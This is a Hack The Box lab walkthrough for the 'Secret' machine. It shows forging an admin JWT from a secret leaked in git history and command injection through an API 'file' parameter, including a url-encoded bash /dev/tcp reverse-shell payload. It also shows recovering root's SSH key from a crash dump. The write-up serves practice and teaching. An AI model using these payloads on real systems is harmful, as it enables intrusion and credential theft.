# Secret

**Date**: 27/07/2022

**Difficulty**: Easy

**CTF**: [https://app.hackthebox.com/machines/Secret](https://app.hackthebox.com/machines/Secret/)

---

Let’s start testing the connection with the target machine:

<figure><img src="../../.gitbook/assets/secret0.png" alt=""><figcaption></figcaption></figure>

We have connection, and the ttl is 63, so we can say that we are probably against a Linux machine.

Let’s scan all TCP ports to see if there are open ports:

<figure><img src="../../.gitbook/assets/secret1.png" alt=""><figcaption></figcaption></figure>

Let’s scan these ports more deeply to try to get the service and the version running there:

<figure><img src="../../.gitbook/assets/secret2.png" alt=""><figcaption></figcaption></figure>

So, there is a SSH service running on port 22. And 2 http services running on 80 and 3000 TCP ports. The one running on port 80 is using nginx 1.18.0 and the one running on port 3000 is using Node.js (Express middleware)

Let’s take a look to them using whatweb:

<figure><img src="../../.gitbook/assets/secret3.png" alt=""><figcaption></figcaption></figure>

Nothing new I guess… Let’s visit them using the web-browser:

<figure><img src="../../.gitbook/assets/secret4.png" alt=""><figcaption></figcaption></figure>

There is a button to download the source code… Let’s download it.

It’s a zip file, so we have to uncompress it:

<figure><img src="../../.gitbook/assets/secret5.png" alt=""><figcaption></figcaption></figure>

Looks like a git repository… We may have a look to the commits if we don’t find nothing useful.

<figure><img src="../../.gitbook/assets/secret6.png" alt=""><figcaption></figcaption></figure>

Back to the webpage, there is a docs section where is explained how to install the software, and how to register a user, how to login and the private routes availables in the software.

The webpage shown when visiting the port 3000 looks identical to the previous one, so I’ll assume is the same one.

Let’s read the documentation in detail:

<figure><img src="../../.gitbook/assets/secret7.png" alt=""><figcaption></figcaption></figure>

They are using JWT tokens to secure the website. And mongodp as database.

Apparently we can use the API to register a user and login also.

<figure><img src="../../.gitbook/assets/secret8.png" alt=""><figcaption></figcaption></figure>

Let’s start trying to register a new user, I’ll use curl to send the POST request:

```jsx
curl -i -X POST -H 'Content-Type: application/json' -d '{"name": "angellm", "email": "alm@alm.com", "password": "angellm123!"}' http://10.10.11.120/api/user/register
```

<figure><img src="../../.gitbook/assets/secret9.png" alt=""><figcaption></figcaption></figure>

It looks like it worked!

Let’s try to log in then:

<figure><img src="../../.gitbook/assets/secret10.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/secret11.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/secret12.png" alt=""><figcaption></figcaption></figure>

So, let’s try to log in using the instructions above:

```jsx
curl -i -X POST -H 'Content-Type: application/json' -d '{"email": "alm@alm.com", "password": "angellm123!"}' http://10.10.11.120/api/user/login
```

<figure><img src="../../.gitbook/assets/secret13.png" alt=""><figcaption></figcaption></figure>

We obtained this auth-token:

```jsx
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmUxNmZlNGNlNmQ2NTA0NWEyZmVkZjYiLCJuYW1lIjoiYW5nZWxsbSIsImVtYWlsIjoiYWxtQGFsbS5jb20iLCJpYXQiOjE2NTg5NDE2Nzh9.Zki6v4H_CTObgP1MB-51j54yezKIQQ6t34yNrE9S_NQ
```

According to the docs it should be a JSON Web Token, so let’s use [https://jwt.io/](https://jwt.io/) to check it:

<figure><img src="../../.gitbook/assets/secret14.png" alt=""><figcaption></figcaption></figure>

Yep, it is and it has my name and email. Ok. Let’s see if we can access somewhere with this auth-token:

<figure><img src="../../.gitbook/assets/secret15.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/secret16.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/secret17.png" alt=""><figcaption></figcaption></figure>

Let’s try to login using the credential of the user we created:

```jsx
curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmUxNmZlNGNlNmQ2NTA0NWEyZmVkZjYiLCJuYW1lIjoiYW5nZWxsbSIsImVtYWlsIjoiYWxtQGFsbS5jb20iLCJpYXQiOjE2NTg5NDE2Nzh9.Zki6v4H_CTObgP1MB-51j54yezKIQQ6t34yNrE9S_NQ' http://10.10.11.120/api/priv
```

<figure><img src="../../.gitbook/assets/secret18.png" alt=""><figcaption></figcaption></figure>

Ok, we receive the message of the normal user. We should try to get the admin user I guess…

We have no idea of the admin credentials, but we can check the files we previously donwloaded. I searched for keywords as “JWT”, “auth-token” or “secret” but I didn’t found anything useful. I said before that the downloaded files are a git repository, so we can inspect the commits:

<figure><img src="../../.gitbook/assets/secret19.png" alt=""><figcaption></figcaption></figure>

“removed .env for secutity reasons” Lol, this looks suspicious… Let’s take a look to the changes of that commit:

<figure><img src="../../.gitbook/assets/secret20.png" alt=""><figcaption></figcaption></figure>

Bingo, that looks like the secret used to validate the auth-tokens.

<figure><img src="../../.gitbook/assets/secret21.png" alt=""><figcaption></figcaption></figure>

If we use it to Encode the data of the user we created before we can see that the JWT obtained is the same.

Using the secret, we should be able to fake an admin auth-token. Looking at `routes/private.js` file we can see that the only verification that is being done is to check if the name of the user is “theadmin”:

<figure><img src="../../.gitbook/assets/secret22.png" alt=""><figcaption></figcaption></figure>

So, let’s bake a JWT with that name:

<figure><img src="../../.gitbook/assets/secret23.png" alt=""><figcaption></figcaption></figure>

And now, let’s use it to login as we did before:

<figure><img src="../../.gitbook/assets/secret24.png" alt=""><figcaption></figcaption></figure>

Success! We are now logged as admin, but what we should do now? hahaha

Looking back to private.js file, there is a route we haven’t used yet: `/logs`

<figure><img src="../../.gitbook/assets/secret25.png" alt=""><figcaption></figcaption></figure>

According to the code, it’s doing something strange at line 38, like a sending a command and showing the output. To bake that command, the parameter file is being collected from the url… so maybe we can inject code there and perform a RCE in the target machine? Let’s try it:

To test it, I’ll listen in my local machine for pings in the tun0 interface:

`tcpdump -i tun0 icmp -n`

And I’ll try to send a ping from the target machine. To do so, I’ll url encode the command I want to execute: `; ping -c 1 10.10.14.13` > `%3Bping%20-c%201%2010.10.14.13`

If this is appended to the command that the target will execute, it should ping my machine.

```jsx
curl -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmUxNmZlNGNlNmQ2NTA0NWEyZmVkZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFsbUBhbG0uY29tIiwiaWF0IjoxNjU4OTQxNjc4fQ.U4MB0eP5yc3eXWzseM_7dP2jf0JZP7RovnoMx9jv4mM' http://10.10.11.120/api/logs?file=%3Bping%20-c%201%2010.10.14.13
```

<figure><img src="../../.gitbook/assets/secret26.png" alt=""><figcaption></figcaption></figure>

Voila! We did it! Let’s try to obtain a reverse shell with the payload: `;bash -c "bash -i >& /dev/tcp/10.10.14.13/443 0>&1"`

url encoded: `%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F443%200%3E%261%22`

```jsx
curl -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmUxNmZlNGNlNmQ2NTA0NWEyZmVkZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFsbUBhbG0uY29tIiwiaWF0IjoxNjU4OTQxNjc4fQ.U4MB0eP5yc3eXWzseM_7dP2jf0JZP7RovnoMx9jv4mM' http://10.10.11.120/api/logs?file=%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F443%200%3E%261%22
```

<figure><img src="../../.gitbook/assets/secret27.png" alt=""><figcaption></figcaption></figure>

Yeah!

<figure><img src="../../.gitbook/assets/secret28.png" alt=""><figcaption></figcaption></figure>

And that’s how we obtain the user flag 🙂

Let’s go for the root flag.

<figure><img src="../../.gitbook/assets/secret29.png" alt=""><figcaption></figcaption></figure>

Ok, so we will have to escalate privileges.

<figure><img src="../../.gitbook/assets/secret30.png" alt=""><figcaption></figcaption></figure>

This user is not inside any cool group…

Let’s look for SUID files:

<figure><img src="../../.gitbook/assets/secret31.png" alt=""><figcaption></figcaption></figure>

There is a strange file there… `/opt/count`

Let’s see what it does:

<figure><img src="../../.gitbook/assets/secret32.png" alt=""><figcaption></figcaption></figure>

It ask us for a file or directory. If we write a directory it lists the content and then it counts some things… As it’s being executed with root permissions, it’s able to see the content of /root folder. Finally, it ask us if we want to save the results. If we say yes it prompts asking for a name to create a file with the results. The data saved is not very interesing.

<figure><img src="../../.gitbook/assets/secret33.png" alt=""><figcaption></figcaption></figure>

Let’s see what happens when we insert a file instead of a directory:

<figure><img src="../../.gitbook/assets/secret34.png" alt=""><figcaption></figcaption></figure>

This time it doesn’t leak the content of the file…

Using this tool we can see that the root user has ssh keys inside the /root/.ssh folder

<figure><img src="../../.gitbook/assets/secret35.png" alt=""><figcaption></figcaption></figure>

If we can grab them we can gain access via ssh as root.

Ok, let’s continue looking for a way to escalate to root: 

<figure><img src="../../.gitbook/assets/secret36.png" alt=""><figcaption></figcaption></figure>

No files with capabilities.

<figure><img src="../../.gitbook/assets/secret37.png" alt=""><figcaption></figcaption></figure>

No cronjobs

<figure><img src="../../.gitbook/assets/secret38.png" alt=""><figcaption></figcaption></figure>

The port 27017 is open internally, and we saw before that is the mongodb database.

<figure><img src="../../.gitbook/assets/secret39.png" alt=""><figcaption></figcaption></figure>

Let’s enumerate the database:

<figure><img src="../../.gitbook/assets/secret40.png" alt=""><figcaption></figcaption></figure>

Ok, we got interesting information there, users and hashed passwords. 

<figure><img src="../../.gitbook/assets/secret41.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/secret42.png" alt=""><figcaption></figcaption></figure>

mmmm… let´s try with this password

<figure><img src="../../.gitbook/assets/secret43.png" alt=""><figcaption></figcaption></figure>

Is not the dasith password.

<figure><img src="../../.gitbook/assets/secret44.png" alt=""><figcaption></figcaption></figure>

And is not valid neither for root user…

OK, let´s go back to the tool we find earlier at /opt directory. Let’s navigate to the /opt folder and see what’s inside:

<figure><img src="../../.gitbook/assets/secret45.png" alt=""><figcaption></figcaption></figure>

It seems that we have access to the C code of the application:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}

void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}

int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

After a while not seeing nothing I can use, I took a look to the official walkthrough

<figure><img src="../../.gitbook/assets/secret46.png" alt=""><figcaption></figcaption></figure>

I didn’t know about this and I would never found it on my own…

<figure><img src="../../.gitbook/assets/secret47.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/secret48.png" alt=""><figcaption></figcaption></figure>

Let's check if a crash report has been generated inside /var/crash/

<figure><img src="../../.gitbook/assets/secret49.png" alt=""><figcaption></figcaption></figure>

As it has been generated, we can use the utility `apport-unpack` to recover the report of this .crash file:

<figure><img src="../../.gitbook/assets/secret50.png" alt=""><figcaption></figcaption></figure>

If we print the content of CoreDump file:

<figure><img src="../../.gitbook/assets/secret51.png" alt=""><figcaption></figcaption></figure>

We can see what looks like a ssh credential, I’m going to copy it to my local machine and set the correct permissions:

<figure><img src="../../.gitbook/assets/secret52.png" alt=""><figcaption></figcaption></figure>

Now, I should be able to use this credential to log as root using ssh:

<figure><img src="../../.gitbook/assets/secret53.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/secret54.png" alt=""><figcaption></figcaption></figure>

And that’s how we gained access to the root flag!